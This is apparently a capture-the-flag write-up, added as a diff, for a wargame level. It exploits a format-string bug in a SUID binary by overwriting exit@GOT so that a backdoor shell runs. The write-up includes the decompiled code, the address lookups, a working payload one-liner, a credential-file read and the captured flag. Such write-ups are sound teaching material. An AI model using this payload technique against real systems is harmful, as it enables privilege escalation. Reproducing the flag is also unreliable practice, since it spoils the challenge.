@@ -1,0 +1,143 @@
+# Level 5
+
+Binary: 32-bit ELF, SUID level6, dynamically linked.
+
+## Analysis
+
+### Ghidra output
+
+```c
+void o(void) {
+    system("/bin/sh");
+    _exit(1);
+}
+
+void n(void) {
+    char local_20c[520];
+    fgets(local_20c, 0x200, stdin);
+    printf(local_20c);               // format string vulnerability
+    exit(1);                          // called through GOT
+}
+
+void main(void) { n(); }
+```
+
+Three pieces line up:
+
+1. `printf(local_20c)`: format string vulnerability (user controls the format string).
+2. `exit(1)`: called right after printf. Since `exit` is a libc function, the call goes through the GOT.
+3. `o()`: a backdoor that spawns `/bin/sh`, but main never calls it.
+
+If I overwrite `exit@GOT` with the address of `o`, the `exit(1)` call jumps to `o` instead of real exit.
+
+## Finding the pieces
+
+### Address of o
+
+```
+(gdb) info functions
+...
+0x080484a4  o
+```
+
+So `o` is at `0x080484a4`.
+
+### Address of exit@GOT
+
+```
+(gdb) x/i 0x80483d0
+0x80483d0 <exit@plt>:  jmp *0x8049838
+```
+
+The PLT stub for exit jumps through `0x08049838`. That's `exit@GOT`.
+
+Confirming with objdump:
+
+```
+$ objdump -R level5 | grep exit
+08049828 R_386_JUMP_SLOT   _exit
+08049838 R_386_JUMP_SLOT   exit
+```
+
+### Buffer position on printf's stack
+
+```
+$ ./level5
+AAAA %x %x %x %x %x %x %x %x %x %x %x %x
+AAAA 200 b7fd1ac0 b7ff37d0 41414141 20782520 ...
+```
+
+`41414141` is at position 4. My input starts there.
+
+## Building the payload
+
+### Target: write 0x080484a4 to 0x08049838 (exit@GOT)
+
+Split into two 16-bit writes:
+
+| Part | Target value | Decimal | Target address |
+|---|---|---|---|
+| High | `0x0804` | 2052 | `0x0804983a` (exit@GOT + 2) |
+| Low  | `0x84a4` | 33956 | `0x08049838` (exit@GOT) |
+
+Write high first (2052 < 33956).
+
+### Layout
+
+```
+position 4 → [0x0804983a]   (exit@GOT + 2)
+position 5 → [0x08049838]   (exit@GOT)
+
+after addresses: 8 bytes printed
+after %2044x:    2052 bytes → %4$hn writes 0x0804 to exit@GOT + 2
+after %31904x:   33956 bytes → %5$hn writes 0x84a4 to exit@GOT
+```
+
+Padding amounts:
+- pad1 = 2052 - 8 = **2044**
+- pad2 = 33956 - 2052 = **31904**
+
+## Exploit
+
+```bash
+python -c 'print "\x3a\x98\x04\x08\x38\x98\x04\x08" + "%2044x%4$hn" + "%31904x%5$hn"' > /tmp/payload5
+(cat /tmp/payload5; cat) | ./level5
+```
+
+Then type blindly:
+
+```
+cat /home/user/level6/.pass
+```
+
+Output:
+
+```
+d3b7bf1025225bd715fa8ccb54ef06ca70b9125ac855aeab4878217177f41a31
+```
+
+Flag: `d3b7bf1025225bd715fa8ccb54ef06ca70b9125ac855aeab4878217177f41a31`
+
+## Notes
+
+### Why GOT overwrite instead of a simple %n to a global?
+
+Levels 3 and 4 had a global variable checked for a magic value. Here there's no such check, but there's a function call (`exit`) that goes through the GOT. That's the hook I redirect.
+
+### Pattern to remember
+
+Any time you see:
+- Format string vulnerability
+- A library function called after it (`exit`, `puts`, `printf`, etc.)
+- No RELRO (GOT writable)
+
+...you can overwrite that function's GOT entry to redirect execution. A backdoor function in the binary (like `o` here) makes the target obvious.
+
+### Little-endian addresses
+
+- `0x08049838` → `\x38\x98\x04\x08` (exit@GOT, low write)
+- `0x0804983a` → `\x3a\x98\x04\x08` (exit@GOT + 2, high write)
+
+### `; cat` needed
+
+`o` calls `system("/bin/sh")`, which is interactive and needs stdin to stay open.
